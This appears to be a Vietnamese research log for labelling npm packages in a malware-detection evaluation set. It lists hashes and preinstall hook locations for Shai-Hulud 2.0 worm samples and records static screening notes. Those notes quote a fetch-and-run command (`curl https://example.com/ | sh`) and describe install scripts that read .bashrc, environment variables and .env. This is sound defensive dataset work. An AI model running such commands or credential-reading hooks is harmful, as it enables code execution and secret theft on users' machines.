| `@swc/core@1.7.40` | `package.json:49` → `postinstall.js:79-128` | `d07233339be28154f922f36e9bea4fb924fda7cc4584dea685d20a8eeeea61878db991bbf25c26b3fd9df168234c9265ce9e8994f82e5c6acc30dce3430d2a36` |
| `@swc/core@1.7.42` | `package.json:49` → `postinstall.js:79-128` | `890ad193748a9dd419e29b49bf5af37904a209840884c8e23bded05ce942702a1a6b338b28f9cb9d7cd4e0abf416e045c987c6d8513de01a11d1723604dd36ab` |

Các bản mới giữ `cluster=esbuild-family, split=test` và `cluster=swc-family, split=dev` cùng bản đã duyệt trước đó, tránh rò rỉ phiên bản gần giống giữa hai tập. Tập lành hiện tập trung ở hai họ gói; cần thêm họ độc lập và kiểm tra chéo của Phạm Minh Triết trước khi dùng để đánh giá mô hình.

## Batch Shai-Hulud 2.0 Datadog — 2026-10-30

Đã đọc tĩnh 40 archive trong Docker, 36 archive đọc thành công; 4 lỗi SSL không được gán nhãn. Chọn 18 tên gói khác nhau, không trùng `labels.csv`, bỏ tên test/demo/example/poc/echo/template. Không chạy `preinstall`, không chạy AI scan và không lưu payload vào Git.

Cả 18 bản có `package.json` khai báo `preinstall: node setup_bun.js`; `setup_bun.js:133-137` tạo tiến trình và `setup_bun.js:180-182` gọi `bun_environment.js`. Hash SHA-256 của `setup_bun.js`: `a3894003ad1d293ba96d77881ccd2071446dc3f65f434669b49b3da92421901a`. Hai biến thể payload `bun_environment.js`: `62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0`, `f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068`. Cả 18 bản có chỉ dấu `.npmrc`, `api.github.com`, `npm publish`. [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/) mô tả cùng chiến dịch đánh cắp credential và tự phát tán; URL archive chính xác nằm ở cột `source` trong `labels.csv`.

| Gói | Hook | SHA-256 archive | SHA-256 payload |
| --- | --- | --- | --- |
| `eslint-config-zeallat-base@1.0.4` | `package.json:13` | `6f279f3198d4984a969032e09e0767fdc6c0acd6d97e411a64426fc351dbc9b2` | `f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068` |
| `axios-builder@1.2.1` | `package.json:13` | `b79feb846ad0ceacea06ab20afacd2b9b4b08638c33c740401d62c4c21001f60` | `f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068` |
| `iron-shield-miniapp@0.0.2` | `package.json:11` | `c5f424fcec3bfb818e5d5152c23cb87f32de4d9ad58790301cb14da3d73e6799` | `f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068` |
| `manual-billing-system-miniapp-api@1.3.1` | `package.json:23` | `dc1d3319329aa302e09b237988c9c3ca9028b97ec917fa67ee23951ff76f2de9` | `f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068` |
| `korea-administrative-area-geo-json-util@1.0.7` | `package.json:10` | `0356b26fa6b0f40ef2d7aad358df4897527f4521cf6908cb6ad6112df034736e` | `f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068` |
| `@asyncapi/problem@1.0.1` | `package.json:39` | `d009a9242ed9bffcdd746508b84e96a84f45949eac121205d2eee30330b405ff` | `f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068` |
| `@quick-start-soft/quick-git-clean-markdown@1.4.2511142126` | `package.json:40` | `ed90d8a286d10ad356f7614e2d721ad0778a5e1953019471ef23f249f02fdbd7` | `f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068` |
| `skills-use@0.1.1` | `package.json:14` | `950f544df437c1d7971553d3a0c757035d913f4d7d15042a7cdef73980bf8f0e` | `62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0` |
| `@quick-start-soft/quick-markdown-image@1.4.2511142126` | `package.json:41` | `5bf45b34bed06e07251c2eeb1693da557570ee287631716c719c7fffdd41de1d` | `f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068` |
| `@mcp-use/mcp-use@1.0.1` | `package.json:7` | `42a75256d41dc89aff6a929baa3901b91dca23c9c5c43c30bf5836e83be7f8a0` | `62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0` |
| `mon-package-react-typescript@1.0.1` | `package.json:8` | `4cb010c7583cc6fbb6bf8081c9317c0893cb1c9f089d641ea08c96baa4f1b8b7` | `62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0` |
| `hopedraw@1.0.3` | `package.json:8` | `d4e8abff38cc5f4f71447176421da29d81d71c848c2e603910f7ac7234f61b4c` | `62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0` |
| `chrome-extension-downloads@0.0.4` | `package.json:9` | `266e9e811a7ff4b7c6589f77828c95a22d6629c5deec4bfb5b98ab3a770db736` | `62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0` |
| `@quick-start-soft/quick-markdown-print@1.4.2511142126` | `package.json:40` | `ea8272cb33bab21c32caebe1a2806fa9d44f3fe886cef363dd0ff89e53fd1e62` | `f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068` |
| `drop-events-on-property-plugin@0.0.2` | `package.json:6` | `9d1284d7d7efbe9447adacb5bcf82d3a62ef65fe62e3f60d61555a5b01c9988c` | `62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0` |
| `react-native-get-pixel-dimensions@1.0.1` | `package.json:21` | `c250545e664d1a4976710994f9d688640073a0ede24c5b5785bc53fd9c3ddb2a` | `62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0` |
| `@antstackio/eslint-config-antstack@0.0.3` | `package.json:48` | `be922683d43a19b637f948a7aa9096d95d1814f759e152c2af2320f72120512e` | `62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0` |
| `tiaan@1.0.2` | `package.json:14` | `55d8d1b04ee5ff43c6dd31ca6a01e3497c734cb6d599d347ae0dae6d92697acf` | `62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0` |

Nhãn `malicious`, cụm `shai-hulud-2-2025-11`, split `dev`; chờ Phạm Minh Triết kiểm tra chéo trước khi dùng để đánh giá. Các bản cùng một chiến dịch không được coi là mẫu độc lập khi chia train/test.
## Sàng lọc nguồn để mở rộng nhãn — 2026-10-29

Danh sách 450 gói hiện là **ứng viên metadata**, không phải 450 nhãn. Bộ lọc tên đơn giản (`test|demo|example|hello|dummy|poc|ctf|sandbox|fake|fail`) tìm thấy 64/450 gói có dấu hiệu là mẫu thử; đây chỉ là tín hiệu ưu tiên kiểm tra, không phải lý do tự động loại hoặc gán nhãn.

Sàng lọc batch 01 (18 gói) bằng `npm pack --ignore-scripts` trong Docker dùng một lần, không mount host và không chạy hook, cho thấy metadata Registry chưa đủ để quyết định hành vi cài đặt: tarball `pinst@3.0.0` có `_postinstall` thay vì `postinstall` (`package.json:13-20`); tarball `contaazul-pinst@1.1.10` có `ignore_prei` và `ignore_posti` (`package.json:13-17`). Ngược lại, gói tên `safe-postinstall-test@0.0.1` khai báo `curl https://example.com/ | sh` trong `package.json:7`; tên gói không chứng minh an toàn. `my-postinstall-pkg@1.0.16` đọc `.bashrc` vào file trong thư mục dự án (`scripts/postinstall.sh:18-42`), còn `test-postinstall-o@1.1.2-beta6` in biến môi trường và đọc `.env` (`scripts/postinstall.js:4-19`). Các ca này mới là quan sát tĩnh; chưa nhập nhãn mới vào `labels.csv` vì cần quyết định phạm vi mẫu test và kiểm tra chéo bằng chứng.

Để tăng bộ nhãn mà không bịa kết quả: lấy ứng viên độc từ [Datadog Malicious Software Packages Dataset](https://github.com/DataDog/malicious-software-packages-dataset) và [OpenSSF Malicious Packages](https://github.com/ossf/malicious-packages); lấy ứng viên lành có hook từ bản phát hành npm và tag mã nguồn chính thức. Xử lý mỗi batch 18 gói: đối chiếu tên/phiên bản và SHA-512 tarball, đọc tĩnh đường chạy install trong Docker, ghi `file:dòng`, nguồn và người/ngày duyệt; chỉ sau đó thêm vào `labels.csv`. Advisory hay việc không có advisory chỉ là nguồn chọn ứng viên, không tự trở thành nhãn cuối. Các mẫu test/demo giữ riêng để demo, tránh làm sai lệch bộ đánh giá.
